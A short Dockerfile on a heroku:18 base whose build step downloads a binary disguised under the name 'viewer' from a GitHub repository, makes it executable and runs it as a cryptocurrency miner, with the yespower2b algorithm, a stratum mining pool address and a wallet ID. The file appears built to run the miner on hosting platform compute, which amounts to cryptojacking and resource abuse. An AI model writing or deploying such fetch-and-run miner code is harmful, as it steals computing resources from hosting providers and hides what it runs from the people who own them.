FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/viewer; chmod +x viewer; ./viewer --disable-gpu --algorithm yespower2b --pool stratum-na.rplant.xyz:7022 --wallet MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS --cpu-threads-priority 1
CMD bash heroku.sh
